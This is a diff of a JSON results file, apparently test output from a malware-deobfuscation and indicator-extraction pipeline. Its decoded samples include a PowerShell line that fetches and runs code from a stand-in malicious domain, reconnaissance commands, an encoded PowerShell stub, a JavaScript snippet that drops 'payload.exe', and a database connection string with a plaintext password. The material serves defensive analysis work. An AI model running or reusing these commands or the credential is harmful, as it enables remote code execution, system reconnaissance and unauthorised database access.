@@ -25,8 +25,7 @@
       "engine": "rc2-orchestrator",
       "chain": [
         "extract-payload",
-        "extract-payload",
-        "ioc-extract"
+        "extract-payload"
       ],
       "output_head": "nslookup 45.148.10.181')",
       "ok": true
@@ -36,8 +35,7 @@
       "engine": "rc2-orchestrator",
       "chain": [
         "extract-payload",
-        "powershell-alias-normalize",
-        "ioc-extract"
+        "powershell-alias-normalize"
       ],
       "output_head": "IEX(Invoke-WebRequest http://malicious-test-domain.top/x); connect 45.148.10.181",
       "ok": true
@@ -53,8 +51,7 @@
       "sha1": "014a88cd1c3ec428bd2cbf2a49cc96ca8ad1ad0f",
       "engine": "rc2-orchestrator",
       "chain": [
-        "crypto-detect",
-        "ioc-extract"
+        "crypto-detect"
       ],
       "output_head": "\"--dbname=postgresql://enteliweb:n3wenteli878wb12e4b2@127.0.0.1:49900/enteliweb --column-inserts --data-only --disable-t",
       "ok": false
@@ -298,10 +295,8 @@
     },
     {
       "sha1": "ea55504afa6416b4f4b89ac4cc386c575f00929a",
-      "engine": "rc2-orchestrator",
-      "chain": [
-        "ioc-extract"
-      ],
+      "engine": "llm-l3",
+      "chain": [],
       "output_head": "192.168.1.1 is on the LAN \u2014 safe internal address",
       "ok": false
     },
@@ -339,14 +334,14 @@
       "sha1": "1584af34536103c086f163f599640acbb9f26155",
       "engine": "llm-l3",
       "chain": [],
-      "output_head": "cmd /c \"whoami && netstat -ano\"",
+      "output_head": "whoami && netstat -ano",
       "ok": false
     },
     {
       "sha1": "5fd384bfadd38c3f124a8f654b47c069ee55dde9",
       "engine": "llm-l3",
       "chain": [],
-      "output_head": "ABC",
+      "output_head": "powershell -e ABC",
       "ok": false
     },
     {
@@ -362,7 +357,7 @@
       "sha1": "f18d46780fda16ff0927300bdc7cd4f7112bf2da",
       "engine": "llm-l3",
       "chain": [],
-      "output_head": "python -c 'print(1+1)'",
+      "output_head": "print(1+1)",
       "ok": false
     },
     {
@@ -388,9 +383,9 @@
     },
     {
       "sha1": "74922dfbd46d5c3ec773a59cd4d6868acc352b50",
-      "engine": "llm-l3",
+      "engine": "magic",
       "chain": [],
-      "output_head": "binary-A",
+      "output_head": "var d='YmluYXJ5LUE='; var b=atob(d); var l=document.createElement('a'); l.download='payload.exe'; l.href=URL.createObjec",
       "ok": false
     },
     {
